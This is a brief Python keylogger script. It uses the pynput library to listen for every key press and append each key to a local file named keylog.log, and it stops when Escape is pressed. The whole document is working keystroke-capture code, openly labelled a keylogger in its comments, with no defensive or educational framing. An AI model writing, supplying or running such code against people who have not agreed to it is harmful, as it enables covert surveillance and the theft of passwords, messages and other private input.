from pynput.keyboard import Key, Listener

# Define the log file name
log_file = "keylog.log"

# Function to write the key to the log file
def write_to_log(key):
    with open(log_file, "a") as f:
        f.write(str(key) + "\n")

# Function to handle key press events
def on_press(key):
    write_to_log(key)

# Function to handle key release events
def on_release(key):
    if key == Key.esc:  # Stop the keylogger when Escape key is pressed
        return False

# Start listening for key events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
